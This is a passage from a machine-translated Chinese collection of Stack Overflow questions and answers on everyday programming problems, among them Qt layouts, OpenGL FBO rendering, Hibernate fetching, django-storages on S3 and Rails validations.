问题解决了。Build 报告了转换 iconset 文件夹的成功操作，但是检查日志显示它拒绝了该文件夹，因为最多有十个文件；我有视网膜所需的所有尺寸，并将数字推到 13，所以我删除了 64@2x 和两个 1024x1024 文件，现在我看到了正确的图标。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2016-04-26T10:41:47.887

它很简单只需添加图标资产并放置所有不同大小的图标，并且还有一些在线工具也可用于应用程序图标制作者，使用它们您一定会解决问题。

# c++ - 从代码访问在 UI 中创建的 Qt 布局？

> ID：12659629
> 
> 赞同：22
> 
> 时间：2012-09-30T07:51:31.863
> 
> 标签：c++, qt, layout, widget, qt-creator

这可能是我遇到过的最愚蠢的问题，但我非常困惑。我正在尝试开始使用布局，但由于某种原因无法弄清楚这一点。

我尝试通过 .ui 文件添加 QGridLayout，只需将其拖放到我的项目中即可。由于我想在加载时使用小部件填充网格，因此我尝试在调用 this->setupui() 之前/之后使用“mainwindow.h”文件中的“gridLayout”对象。

由于我无法弄清楚，我选择尝试使用代码从头开始创建它，并将以下内容添加到 main.cpp 文件中。这也没有显示，所以我想知道如何在表单加载时填充网格。

```
#include <QtGui/QApplication>
#include <QtGui>
#include "mainwindow.h"

int main(int argc, char *argv[])
{
    QApplication app(argc, argv);
    MainWindow w;

    QGridLayout *grid = new QGridLayout;

    QLabel *label1 = new QLabel("test");
    QLabel *label2 = new QLabel("test 2");

    grid->addWidget(label1, 0, 0);
    grid->addWidget(label2, 0, 1);
    w.setLayout(grid);

    w.show();
    return app.exec();
} 
```

* * *

## 回答 #1

> 赞同：28
> 
> 时间：2012-09-30T09:02:08.427

假设，您只需将 QtDesigner 中的 QGridLayout 设置为 MainWindow 中的 centralWidget，如下所示：

![在此处输入图像描述](../Images/fb924704fc8b76d7d4dfe594cc2e24b4.png)

您可以使用正确的对象名称（这里是 gridLayout）在 MainWindow 代码中访问它：

```
MainWindow::MainWindow(QWidget *parent) :
    QMainWindow(parent),
    ui(new Ui::MainWindow)
{
    ui->setupUi(this);
    ui->gridLayout->addWidget(new QLabel("hello world"),0,0);
} 
```

如果您在 QtDesigner 或代码中设置了布局并且想要更改布局，QWidget 不会让您安装另一个布局，您将收到如下错误消息：

> QWidget::setLayout: 试图在已经有布局的 MainWindow“MainWindow”上设置 QLayout“”

在这种情况下，您必须首先删除现有布局，然后像上面的代码一样安装新布局。

如果你想在你的 main 函数中访问布局，你可以通过 QObject::findChild 函数来实现，如下所示：

```
int main(int argc, char *argv[])
{
    QApplication a(argc, argv);
    MainWindow w;

    QGridLayout *gridLayout = w.findChild<QGridLayout*>("gridLayout");
    Q_ASSERT(gridLayout);
    gridLayout->addWidget(new QLabel("hello, the second"));

    w.show();
    return a.exec();
} 
```

# url - 使用“必需步骤”功能时，Google Analytics（分析）显示重复转化

> ID：12659641
> 
> 赞同：0
> 
> 时间：2012-09-30T07:53:01.790
> 
> 标签：url, google-analytics, analytics, goal-tracking

我在 Analytics 中设置了两个目标。两者都具有相同的目标 URL，但具有不同的步骤，并且具有不同的第一步，这是必需的。

例如，对于目标 1，我有：

1.  /product1/step1 - 必需
2.  /product1/step2
3.  /谢谢你

对于目标 2，我有：

1.  /product2/step1 - 必需
2.  /product2/step2
3.  /谢谢你

当有人购买产品 1 时，我在分析中得到目标 1 和目标 2 的转化，表明两种产品都已购买。

我不太明白第一个必需步骤是什么，如果不检查目标何时产生（购买了什么产品）？

如果我错了，我该如何设置它，这样他们就不会转换为一个目标，而是转换为两个目标，因为它打算起作用？

我需要使用一个目标网址 (/thank-you)，因为它是我检查付款是否已处理的页面。为不同的目标复制同一页面是愚蠢的。

谢谢

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-03-06T19:25:33.297

“必需步骤”复选框仅在通过漏斗可视化报告查看结果时使用。

它对其他报告没有影响。

在您的特定情况下，您需要专门使用可视化报告（不推荐）。或者想办法实现不同的登陆页面。

> 从谷歌分析帮助：
> 
> 所需的第一步仅适用于漏斗可视化报告。当您将 > 第一步标记为必需时，漏斗可视化报告仅包含 > 通过该必需步骤的目标转化。其他访问只是从报告中删除。
> 
> 如果您在其他报告中看到转化率，但在“渠道”>“可视化”报告中看到零转化率，这表明在 > 转化的访问期间未查看所需的步骤

[http://support.google.com/analytics/bin/answer.py?hl=en&answer=2976313](http://support.google.com/analytics/bin/answer.py?hl=en&answer=2976313)

希望这可以帮助。

# c - 绘制到 FBO - 精灵上下颠倒问题

> ID：12659643
> 
> 赞同：9
> 
> 时间：2012-09-30T07:53:52.887
> 
> 标签：c, opengl-es, opengl-es-2.0, glsl

好吧，FBO 的使用范围很广，它有助于使复杂的效果更容易。我设置FBO并绘制它，然后渲染FBO纹理四边形，没有任何问题，甚至测试简单的屏幕处理颜色着色器。但是由于某种原因，我渲染给 FBO 的所有内容都颠倒了。如果我渲染到股票屏幕 FBO 一切正常，我什至不执行任何旋转精灵。

**FBO创建**

```
typedef struct tex
{
 dim2i size; // int width, int height
 GLuint id;
} tex;

typedef struct fbo
{
 GLuint frame_buffer;
 tex buffer_tex;
}fbo;

void set_fbo(fbo* res, int width, int height)
{
 GLint tex_size;
 glGetIntegerv(GL_MAX_TEXTURE_SIZE, &tex_size);
 GLint render_buffer_size;
 glGetIntegerv(GL_MAX_RENDERBUFFER_SIZE, &render_buffer_size);
 LOGI("Max render buffer size: %d, max texture size: %d", render_buffer_size, tex_size);    //max render buffer size: 3838, max texture size: 2048
 glGenFramebuffers(1, &res->frame_buffer);
 GLuint depth_buffer;
 glGenRenderbuffers(1, &depth_buffer);
 glGenTextures(1, &res->buffer_tex.id);
 res->buffer_tex.size.w = width;
 res->buffer_tex.size.h = height;
 glBindTexture(GL_TEXTURE_2D, res->buffer_tex.id);
 glTexImage2D(GL_TEXTURE_2D, 0, GL_RGB, res->buffer_tex.size.w, res->buffer_tex.size.h, 0, GL_RGB, GL_UNSIGNED_BYTE, NULL);
 glTexParameteri(GL_TEXTURE_2D, GL_TEXTURE_WRAP_S, GL_CLAMP_TO_EDGE);
 glTexParameteri(GL_TEXTURE_2D, GL_TEXTURE_WRAP_T, GL_CLAMP_TO_EDGE);
 glTexParameteri(GL_TEXTURE_2D, GL_TEXTURE_MAG_FILTER, GL_LINEAR);
 glTexParameteri(GL_TEXTURE_2D, GL_TEXTURE_MIN_FILTER, GL_LINEAR);
 glBindRenderbuffer(GL_RENDERBUFFER, depth_buffer);
 glRenderbufferStorage(GL_RENDERBUFFER, GL_DEPTH_COMPONENT16, res->buffer_tex.size.w, res->buffer_tex.size.h);
 glBindFramebuffer(GL_FRAMEBUFFER, res->frame_buffer);
 glFramebufferTexture2D(GL_FRAMEBUFFER, GL_COLOR_ATTACHMENT0, GL_TEXTURE_2D, res->buffer_tex.id, 0);
 glFramebufferRenderbuffer(GL_FRAMEBUFFER, GL_DEPTH_ATTACHMENT, GL_RENDERBUFFER, depth_buffer);
 if(glCheckFramebufferStatus(GL_FRAMEBUFFER) == GL_FRAMEBUFFER_COMPLETE)
    LOGE("BUFFER OK");
 else
    LOGE("BUFFER NOT OK");
//BUFFER OK 
 glBindFramebuffer(GL_FRAMEBUFFER, 0);
 glBindTexture(GL_TEXTURE_2D, 0);
} 
```

**FBO 使用情况**

```
static fbo FBO;
static decor DECOR; //shield quad
static decor SCREEN_DECOR;// FBO textured quad

void on_surface_changed(int width, int height)
{
 set_fbo(&FBO, width, height);
 ...
}

void on_draw()
{
 glBindFramebuffer(GL_FRAMEBUFFER, FBO.frame_buffer);
 set_render_color(YELLOW); //glClearColor(...)
 glClear(GL_COLOR_BUFFER_BIT | GL_DEPTH_BUFFER_BIT);
 draw_decor(&DECOR, get_shader(SPRITE_SIMPLE_SHADER), *get_proj(ORTHO_PROJ));
 glBindFramebuffer(GL_FRAMEBUFFER, 0);
 set_render_color(BLACK);
 glClear(GL_COLOR_BUFFER_BIT | GL_DEPTH_BUFFER_BIT);
 draw_decor(&SCREEN_DECOR, get_shader(SPRITE_SIMPLE_SHADER), *get_proj(ORTHO_PROJ));
} 
```

**结果：** ![与 FBO](../Images/67e13a79528f8feefc216bded99180a0.png) **带有灰度着色器的结果：** ![带灰度着色器](../Images/f706170f599991a6b1aa4032711a13e6.png)

**不使用 FBO 渲染：**

```
void on_draw_simple()
{
 set_render_color(YELLOW); //glClearColor(...)
 glClear(GL_COLOR_BUFFER_BIT | GL_DEPTH_BUFFER_BIT);
 draw_decor(&DECOR, get_shader(SPRITE_SIMPLE_SHADER), *get_proj(ORTHO_PROJ));
} 
```

![没有 FBO](../Images/e1076835d822470a05d63cbb9aef74f1.png)

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-10-30T16:00:07.363

从评论汇总：

发生这种情况是因为 OpenGL 的原点位于左下角，这与大多数使用的窗口系统不同，原点位于左上角。

只需确保纹理坐标从左上角的 0,1 变为右下角的 1,0 即可正确绘制 FBO，或者绘制垂直翻转纹理的四边形。

# hibernate - Hibernate Eager 初始化获取父对象的多个实例

> ID：12659644
> 
> 赞同：0
> 
> 时间：2012-09-30T07:53:59.567
> 
> 标签：hibernate, hibernate-mapping

我有以下两个实体

```
@Entity
public class Manufacturer {

    private int manufacturerId;
    private Category category;
    private Set<Products> productList;

    @OneToMany(cascade=CascadeType.ALL, fetch=FetchType.EAGER)
    @JoinTable(name="manufacturer_products", joinColumns={@JoinColumn(name="manufacturerId")}, 
    inverseJoinColumns={@JoinColumn(name="productId")})
    public Set<Product> getProductList() {
        return productList;
    }
    public void setProductList(Set<Product> productList) {
        this.productList = productList;
    }
        @ManyToOne
    @JoinColumn(name="categoryId")
    public Category getCategory() {
        return category;
    public void setCategory(Category category) {
        this.category = category;
    }
}

@Entity
public class Product {

    private int productId;
    private String modelNumber;
    private String name;
    private String description;
    private Category category;
    } 
```

我想查找与某个类别相关的制造商。由于产品和制造商之间的关系被急切地初始化，它获取了映射到制造商产品表中的所有制造商实例。另外，请注意输出列表包含同一制造商的多个实例。如果我尝试延迟初始化，那么在这种情况下，它会给我一个 LazyInitialization 异常，或者我需要遍历产品列表并手动获取数据。我试图避免后一种方法，因为那将是一个很好的性能打击。我已经阅读了休眠文档，但找不到任何解决问题的方法。请让我知道我是否缺少任何东西或您是否需要其他任何东西。任何帮助将不胜感激。

这是我的 DAO 类方法，我将带有 Category 的制造商实例传递给它。它基于此进行查找。

```
public List<Manufacturer> findByCategory(Category instance){
    log.debug("Get Manufacturer by Category");
    try {
        List<Manufacturer> results = (List<Manufacturer>) sessionFactory
                .getCurrentSession()
                .createCriteria("com.me.ham.core.model.Manufacturer")
                .add(Restrictions.eq("category", instance))
                .list();
        log.debug("findByCategory successful, result size: "
                + results.size());
        return results;
    } catch (RuntimeException re) {
        log.error("findByCategory failed", re);
        throw re;
    }
} 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-09-30T08:45:12.240

如果我理解正确，在 HQL 中，灵魂是这样的：

```
 select m 
 from Manufacturer m 
    left join fetch m.category cat
    left join fetch m.productList productList
 where cat = :categoryParam 
```

我不是写作标准的专家，但你可以使用`setFetchMode`. 这里有一些信息：[休眠性能：19.1.2](http://docs.jboss.org/hibernate/orm/3.3/reference/en/html/performance.html)。

# javascript - Firefox 不需要的滚动

> ID：12659649
> 
> 赞同：2
> 
> 时间：2012-09-30T07:54:43.790
> 
> 标签：javascript, html, css, firefox, scroll

我的一个项目页面上有这个问题。

当我在 Firefox 浏览器上测试页面时，我发现启用了水平滚动条，考虑到问题仅出现在 Firefox 上，我可以以相同的页面宽度水平滚动。

有什么建议吗？

这是我正在处理的页面。

[http://www.iagha.com/asdqwezxc/contactUs.php](http://www.iagha.com/asdqwezxc/contactUs.php)

下面是一些图片来描述我的情况！

![在此处输入图像描述](../Images/d993d5c5259587f7b1e5dde59d1ba5e9.png)

![在此处输入图像描述](../Images/0b08cba587e6933b639aa0db664a41d8.png)

![在此处输入图像描述](../Images/b7590b7af4b4ab5d8cbf8b914ec7baff.png)

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-09-30T08:25:55.800

您在表格的最后一行有一个`text-indent`输入`send`按钮，用于联系表格。当前设置为`2000px`- 将其设置为`-2000px`，水平滚动条将在 Firefox 中消失。

# iphone - Xcode - 创建 csv/电子表格文件

> ID：12659654
> 
> 赞同：3
> 
> 时间：2012-09-30T07:55:53.647
> 
> 标签：iphone, objective-c, ios, xcode, arrays

我有三个数组。第一个数组包含字符串，与第二个相同，但是第三个包含`NSNumber`'s。无论如何，回到主题......我如何创建一个像电子表格一样的 csv（这是一个 excel/数字）文件来包含这些数据。是否可以？

这是我的三个数组：

locationArray - 包含许多字符串 dateArray - 包含许多字符串 milesArray - 包含许多`NSNumber`'s

但是每个数组都包含相同数量的对象，因此（例如在表格视图中）您可以将数据拼凑到一个`NSDictionary`. 它就像一条链子。

那么它看起来像这样：

```
NSDictionary *firstFlight = [NSDictionary dictionaryWithObjectsAndKeys:[locationArray objectAtIndex: 0], @"FlightName", [dateArray objectAtIndex: 0], @"FlightDate", [milesArray objectAtIndex: 0], @"FlightMiles", nil]; 
```

该字典将包含一个航班（此测试应用程序的功能是记录航班）。因此，如果我使用`for`循环枚举它并替换`objectAtIndex:`为循环数字，我可以获得许多航班词典。

现在您了解了我的数据结构是如何工作的。例如，我如何创建一个 excel/数字/电子表格 CSV 文件看起来像这样（只是它可能看起来的屏幕截图）：

（里程数据只是编造的）

![在此处输入图像描述](../Images/b649ca63f4fc154a4d7a5edb811b4cdc.png)

* * *

## 回答 #1

> 赞同：13
> 
> 时间：2012-09-30T08:37:24.913

```
 NSArray *firstArray, *secondArray, *thirdArray;

NSMutableString *csv = [NSMutableString stringWithString:@"Name,Date,Miles"];

NSUInteger count = [firstArray count];
// provided all arrays are of the same length
for (NSUInteger i=0; i<count; i++ ) {
    [csv appendFormat:@"\n\"%@\",%@,\"%d\"",
        [firstArray objectAtIndex:i],
        [secondArray objectAtIndex:i],
        [[thirdArray objectAtIndex:i] integerValue]
     ];
    // instead of integerValue may be used intValue or other, it depends how array was created
}

NSString *yourFileName = @"your filename";
NSError *error;
BOOL res = [csv writeToFile:yourFileName atomically:YES encoding:NSUTF8StringEncoding error:&error];

if (!res) {
    NSLog(@"Error %@ while writing to file %@", [error localizedDescription], yourFileName );
} 

```

# django - django-storages + sorl_thumbnail + S3 不能很好地协同工作（URL 不匹配）

> ID：12659655
> 
> 赞同：11
> 
> 时间：2012-09-30T07:56:05.510
> 
> 标签：django, amazon-s3, boto, sorl-thumbnail, django-storage

我将 django-storages 和 sorl_thumbnail 一起使用，并且我将 Amazon S3 用于静态和媒体文件。我正在使用一个带有 2 个文件夹的存储桶，1 个用于静态文件夹，1 个用于媒体文件夹。

这是我的配置：

```
MEDIA_ROOT = '/media/'
MEDIA_URL = 'https://s3.amazonaws.com/my-bucket/media/'
STATIC_ROOT = '/static/'
STATIC_URL = 'https://s3.amazonaws.com/my-bucket/static/'
AWS_STORAGE_BUCKET_NAME = 'my-bucket'
DEFAULT_FILE_STORAGE = 'my_lib.s3utils.MediaRootS3BotoStorage'
STATICFILES_STORAGE = 'my_lib.s3utils.StaticRootS3BotoStorage' 
```

`MediaRootS3BotoStorage`并`StaticRootS3BotoStorage`定义如下：

```
StaticRootS3BotoStorage = lambda: S3BotoStorage(location='static')
MediaRootS3BotoStorage = lambda: S3BotoStorage(location='media') 
```

当我使用 sorl_thumbnail 时，生成的缩略图位于正确的目录中：`https://s3.amazonaws.com/my-bucket/media/cache`但是当 sorl_thumbnail 试图检索已经存在的缩略图时，生成的 URL 是：`https://s3.amazonaws.com/my-bucket/cache`，您会注意到该`media`文件夹​​被省略了。

你知道我该如何解决吗？

我知道我可以只使用 django-storages 并将我的静态和媒体文件都混合在我的存储桶中，但这对我的口味来说有点太脏了 :)

谢谢！

* * *

## 回答 #1

> 赞同：17
> 
> 时间：2012-11-10T10:49:01.860

**我能够通过定义MediaRootS3BotoStorage**和**StaticRootS3BotoStorage**使其工作，如下所示：

```
from storages.backends.s3boto import S3BotoStorage
from django.conf import settings

class StaticRootS3BotoStorage(S3BotoStorage):
    """
    Storage for static files.
    """

    def __init__(self, *args, **kwargs):
        kwargs['location'] = 'static'
        super(StaticRootS3BotoStorage, self).__init__(*args, **kwargs)

class MediaRootS3BotoStorage(S3BotoStorage):
    """
    Storage for uploaded media files.
    """

    def __init__(self, *args, **kwargs):
        kwargs['location'] = 'media'
        super(MediaRootS3BotoStorage, self).__init__(*args, **kwargs) 
```

此链接可能会有所帮助[https://github.com/jamstoks/django-s3-folder-storage](https://github.com/jamstooks/django-s3-folder-storage)

* * *

## 回答 #2

> 赞同：8
> 
> 时间：2013-05-23T15:45:17.587

我遇到了同样的问题，Salma Hamed 的解决方案对我来说是正确的。

在我们有之前

```
StaticRootS3BotoStorage = lambda: S3BotoStorage(location='static')
MediaRootS3BotoStorage = lambda: S3BotoStorage(location='media') 
```

这导致我们的 thumbnail_kvstore 表中的“存储”值错误。此 lambda 定义不会创建新类，因此 type(StaticRootS3BotoStorage()) 返回写入表中的“storages.backends.s3boto.S3BotoStorage”。因为这些“存储”值用于稍后实例化存储，以便在显示时获取图像 URL，这导致 S3BotoStorage() 用于此目的。所以'位置'论点丢失了。

Salma Hamed 将这些自定义存储定义为类的解决方案解决了这个问题。

感谢那！

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-10-05T17:58:33.283

您是否尝试将 THUMBNAIL_PREFIX 设置为 media/cache/？

[http://sorl-thumbnail.readthedocs.org/en/latest/reference/settings.html#thumbnail-prefix](http://sorl-thumbnail.readthedocs.org/en/latest/reference/settings.html#thumbnail-prefix)

* * *

## 回答 #4

> 赞同：1
> 
> 时间：2012-10-13T04:17:36.717

我遇到了同样的问题，但我想出了一个解决方法。

我将我的`DEFAULT_FILE_STORAGE`背部设置为`storages.backends.s3boto.S3BotoStorage`，这样，当它查找时`cache/`它不会丢失，我仍然可以将我的所有文件上传到`media/`，并且`python manage.py collectstatic`仍然可以正常工作，因为我仍然将那个设置为`StaticRootS3BotoStorage = lambda: S3BotoStorage(location='static')`.

希望这对您有所帮助，因为这个问题让我发疯了。

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2013-01-27T08:25:21.037

发现正在使用（在创建初始缩略图后的下一个请求中`sorl-thumbnail`）返回缓存的`KV`图像。看起来没有任何影响。`url``STATIC_URL``MEDIA_URL`

不是最好的解决方案。添加了`S3`路由规则。

```
<RoutingRules>
  <RoutingRule>
    <Condition>
      <KeyPrefixEquals>cache/</KeyPrefixEquals>
    </Condition>
    <Redirect>
      <ReplaceKeyPrefixWith>media/cache/</ReplaceKeyPrefixWith>
    </Redirect>
  </RoutingRule>
</RoutingRules> 
```

* * *

## 回答 #6

> 赞同：0
> 
> 时间：2020-07-13T06:11:41.113

IDK 为什么但@SalmaHamed 的解决方案对我不起作用（可能是因为 django 版本的变化或其他原因）。相反，我将：替换`MediaRootS3BotoStorage = lambda: S3Boto3Storage(location='media')`为： `class MediaRootS3BotoStorage(S3Boto3Storage): location = 'media'`

# java - 是否可以获取 java 包中所有接口的列表？

> ID：12659663
> 
> 赞同：1
> 
> 时间：2012-09-30T07:57:09.110
> 
> 标签：java, reflection

我想获得一个包中所有接口的列表，因此我不必手动更新新接口列表。所以我想是否有可能通过反射获取给定包中所有接口的列表。我知道可以在包中获取所有类，但我不知道如何使用接口来做到这一点。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-09-30T08:04:26.683

如果您知道如何枚举一个包中的所有类，只需先这样做，然后通过调用[`Class.isInterface()`](http://docs.oracle.com/javase/7/docs/api/java/lang/Class.html#isInterface()).

# 另见

*   [您可以使用反射找到包中的所有类吗？](https://stackoverflow.com/questions/520328)
*   [如何枚举包中的所有类并将它们添加到列表中？](https://stackoverflow.com/questions/176527)

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-09-30T08:04:40.410

您可以（尝试）[列出包中的所有类](https://stackoverflow.com/questions/176527/how-can-i-enumerate-all-classes-in-a-package-and-add-them-to-a-list)。然后，您可以检查每个类以查看它是否是[该`Class#isInterface()`方法](http://docs.oracle.com/javase/7/docs/api/java/lang/Class.html#isInterface%28%29)的接口。

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2018-07-26T13:01:14.027

我不知道“手动更新新接口列表”的确切含义，但是如果您只想获取特定包中包含的所有接口的列表并且使用***spring***，则可以执行以下操作：

```
 // Instantiate new ClassPathScanner, usualy used to get classes annotated with @Service, @Component.
    // The false paramater is provided to disable these default filters.
    // Since the ClassPathScanningCandidateComponentProvider only scanns for toplevel classes we 
    // override the default isCandidateComponent Method to return Interfaces instead.
    ClassPathScanningCandidateComponentProvider provider = new ClassPathScanningCandidateComponentProvider(false) {
        @Override
        protected boolean isCandidateComponent(AnnotatedBeanDefinition beanDefinition) {
            return beanDefinition.getMetadata().isInterface();
        }
    };

    // Filter to include only classes that have a particular annotation.
    // Since we disables the default filters we have to provide this one.
    // Here we can provide any regex we want, in this case we fillter all provided classes / interfaces.
    provider.addIncludeFilter(new RegexPatternTypeFilter(Pattern.compile(".*")));

    // define package to scan.
    Set<BeanDefinition> beans = provider.findCandidateComponents("compu.global.hyper.mega.net");

    beans.forEach(bd -> {
        System.out.println(bd.getBeanClassName());
    }); 
```

# file - ping IP 地址的批处理文件和显示较低最小值/平均值/较高最大值的文本文件

> ID：12659676
> 
> 赞同：0
> 
> 时间：2012-09-30T07:59:38.843
> 
> 标签：file, batch-file, response, ping, average

有没有办法连续 ping 一个 IP 地址并打印一个仅显示较低的最小值/平均值/较高的最大值的文本文件？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-10-01T12:09:15.623

您可以使用 ping`-t`选项。它会不断地ping。您可以随时按`<Ctrl-Break>`查看统计信息，包括最小/平均/最大。按`<Ctrl-C>`退出。

# jquery - 没有图像预加载的jQuery分页修改

> ID：12659678
> 
> 赞同：0
> 
> 时间：2012-09-30T07:59:52.887
> 
> 标签：jquery, pagination, preload

我使用 jQuery Pagination 修改来对我的项目中的页面进行分页，它比 ajax PHP 使用的更快，教程：[http](http://www.xarg.org/2011/09/jquery-pagination-revised/) ://www.xarg.org/2011/09/jquery-pagination-revised/ ，它有一个修改status ，当我们从浏览器点击前进和后退按钮时，我们可以得到上一个分页页面。问题在于大量项目（要分页的项目超过 500 个），在分页之前预加载所有项目需要更多时间。有没有什么办法可以忽略这个插件的预加载动作？？？

谢谢您的建议...

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-10-09T13:17:04.690

解决方案是：将插件更改为另一个，例如使用 ajax 分页锚。

# ruby-on-rails - 如何在rails中建立关系？

> ID：12659680
> 
> 赞同：0
> 
> 时间：2012-09-30T07:59:58.287
> 
> 标签：ruby-on-rails

基本上，现在我有一个位置和一个用户，并且关系“跟随”。这两者都是 has_and_belongs_to_many 关系。我已经在数据库中创建了用户和位置，但是当用户决定关注某个位置时，我想将两者连接起来。我该怎么做呢？

我曾想过使用 LocationUser.new(..)，其中 LocationUser 是位置和用户表或 Location.create(...) 或其他东西的连接表，但我不觉得其中任何一个在做什么我想要做。

提前非常感谢！

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-09-30T08:22:46.277

您可以使用范围加法（如果您不使用连接模型，则为真正的 habtm）：

```
current_user.locations << @location 
```

或范围创建（如果您有连接模型）：

```
current_user.location_users.create(:location_id => @location) 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-09-30T08:02:03.077

连接表不应该有模型，也不能有外键。`id: false`在 create_table 迁移中设置。

然后，`User.locations << Location.new`或类似的。

# c# - 使用 WebBrowser 获取 Html 代码 IFrame 时出现 UnauthorizedAccessException

> ID：12659687
> 
> 赞同：0
> 
> 时间：2012-09-30T08:02:05.040
> 
> 标签：c#, iframe, browser, unauthorizedaccessexcepti

使用 IE 或 Chrome 中的开发人员工具，我得到一个框架的 html 代码。没问题。

现在，我想使用 C# 应用程序来完成。我在 VS2010 中有 System.Windows.Form.WebBrowser。我尝试获取框架的 Html 代码。

```
 public static HtmlElementCollection GetElementsByTagNameForFrame(this WebBrowser wb, 
                                             string tag, string idFrame)
 {
      return wb.Document.Window.Frames[idFrame].Document.GetElementsByTagName(tag);
 } 
```

但我收到错误 UnauthorizedAccessException。

我再次尝试[使用 Webbrowser C# 从 iframe 读取 HTML 代码，](https://stackoverflow.com/questions/4146184/read-html-code-from-iframe-using-webbrowser-c-sharp)但我得到了同样的错误。

```
string content = doc.Window.Frames["injected-iframe"].WindowFrameElement.InnerText; 
```

有什么建议么 ？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-09-30T09:56:26.750

你没有写它，但我假设 iFrame 包含来自**不同域**的内容。现代浏览器包含一些反 XSS 机制，比如这样，给攻击者更多的工作。

在这种情况下，最简单的方法是检查 iFrame 中显示的内容，然后使用 WebClient 手动下载其中的网页。如果是某种会员区，您可能需要复制 cookie。因此，只需获取 iframe 的 src 属性并用于`WebClient.DownloadString`下载此页面。

# java - IntelliJ：如何同时调试 GAE 和 GWT？

> ID：12659691
> 
> 赞同：0
> 
> 时间：2012-09-30T08:02:55.900
> 
> 标签：java, google-app-engine, gwt, intellij-idea

我正在 IntelliJ 中使用 GAE 和 GWT 开发一个小项目。我的一个问题是我不能同时调试这两个部分。

我为 GWT 创建了一个调试配置，为 GAE 创建了另一个调试配置。如果我使用 GWT 配置进行调试，我无法使用 GAE 做任何事情，反之亦然。

我如何配置 IntelliJ 以便我可以同时调试这两种技术？

非常感谢

# ruby-on-rails - Rails 包含验证

> ID：12659693
> 
> 赞同：5
> 
> 时间：2012-09-30T08:03:34.883
> 
> 标签：ruby-on-rails, validation, inclusion

我正在努力进行以下包含验证，

```
class User < ActiveRecord::Base
  attr_accessible :language

  validates :language, :presence => true, :inclusion => { :in => I18n.available_locales.join(' ')}
end 
```

如果我在控制台中运行它，

```
u = User.new
u.valid? 
```

然后我`TypeError: can't convert nil into String`在`include?`.`active_model/validations/inclusion.rb`

但是，如果我将验证行更改为，

```
validates :language, :presence => true, :inclusion => { :in => %(en fr es)} 
```

然后验证按预期工作。如果 language 为 nil 或不是您所期望的列表中的条目之一并且没有崩溃，则它是无效的。

我已经通过代码来验证它是否可以生成包含列表，它就是这样。那么它为什么会崩溃呢？存在验证不应该解决问题并阻止任何进一步的验证吗？为什么当我生成列表而不是硬编码值时它会崩溃？

我什至尝试使用 proc 形式`:in`来查看是否有任何区别，但它没有。但后来我真的没想到需要这样做，因为我只想在应用程序加载时生成一次列表，因为 I18n.available_locales 在应用程序执行期间永远不会改变。

更新：我有一个想法并测试了以下代码，

```
class User < ActiveRecord::Base
  attr_accessible :language

  validates :language, :presence => true, :inclusion => { :in => ['en','fr','es'].join(' ') }
end 
```

这段代码也会产生同样的错误，所以问题不在于 I18n 或类似的东西。`%(en fr es)`它与和之间的差异有关`['en','fr','es'].join(' ')`。

* * *

## 回答 #1

> 赞同：12
> 
> 时间：2012-09-30T08:56:09.187

您的第二个条件起作用的原因`#include?`是为 String 类定义的：

```
> "qwertyuiop".include? "tyu"
true 
```

因此，如果您验证包含在`%(en fr es)`（正是`"en fr es"`）中，则一个值`"n f"`将通过验证。

您必须使用数组（作为文字`[]`或单词`%w()`）。如果你想使用 I18n.available_locales 确保将它们转换为字符串

```
validates :language, :inclusion => { :in => I18n.available_locales.map(&:to_s) } 
```

我无法重现您的错误，但`:presence`验证是无用的，因为`:inclusion`已经检查了列表中的值。

* * *

## 回答 #2

> 赞同：4
> 
> 时间：2012-09-30T08:36:09.067

您应该将数组传递给`inclusion`验证，而不是字符串。因此，在您的示例中，`%(en fr es)`如果您使用`%w(en fr es)`它可以正常工作。

# javascript - html高效可伸缩表格列

> ID：12659695
> 
> 赞同：0
> 
> 时间：2012-09-30T08:03:49.800
> 
> 标签：javascript, jquery, css, html-table

我正在尝试创建一个带有可伸缩列的动态 html 表。在实际情况下，每个标题可以有 20 列和最多 400 个值。我想呈现这样的数据：

```
-----------------------------------------------------------
|    |            Header 1          | Header 2 | Header 3 |
-----------------------------------------------------------
|val1| col1.1 | col1.2 |...| col1.x | col 2.1  | col 3.1  |
-----------------------------------------------------------
|val2| col1.1 | col1.2 |...| col1.x | col 2.1  | col 3.1  |
-----------------------------------------------------------
 ...
-----------------------------------------------------------
|valx| col1.1 | col1.2 |...| col1.x | col 2.1  | col 3.1  |
-----------------------------------------------------------
|foot| foot1.1| foot1.2|...| foot1.x| foot2.1  | foot3.1  |
----------------------------------------------------------- 
```

我希望能够单击和 colx.1，展开或显示同一标题下的所有列，并折叠（或隐藏）其他标题的其他列。从上面的表格中单击任何 col2.1 单元格，然后将表格更改为：

```
-----------------------------------------------------------
|    | Header 1 |            Header 2          | Header 3 |
-----------------------------------------------------------
|val1| col 1.1  | col2.1 | col2.2 |...| col2.x | col 3.1  |
-----------------------------------------------------------
|val2| col 1.1  | col2.1 | col2.2 |...| col2.x | col 3.1  |
-----------------------------------------------------------
 ...
-----------------------------------------------------------
|valx| col 1.1  | col2.1 | col2.2 |...| col2.x | col 3.1  |
-----------------------------------------------------------
|foot| foot1.1  | foot2.1| foot2.2|...| foot2.x| foot3.1  |
----------------------------------------------------------- 
```

我试图做类似的事情：在所有可以显示/隐藏的 td 元素上使用可隐藏的类，例如：

```
var rows = $('tr');
rows.find('th:eq(1), td:eq(1)').on('click', function() {
    $('.hideable').toggle()
}); 
```

我还需要相应地更改页眉和页脚的 colspan

```
('th#foot1.1').attr('colspan',1) 
```

上述解决方案有效，但效率非常低，而且看起来不是很干净。

添加了简化的 jsFiddle 示例[jsfiddle.net/yrMsX](http://jsfiddle.net/yrMsX/)。我们的想法是不要同时扩展标题 1 和 2。

有没有更好、更有效的方法来实现这一目标？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-09-30T10:32:11.617

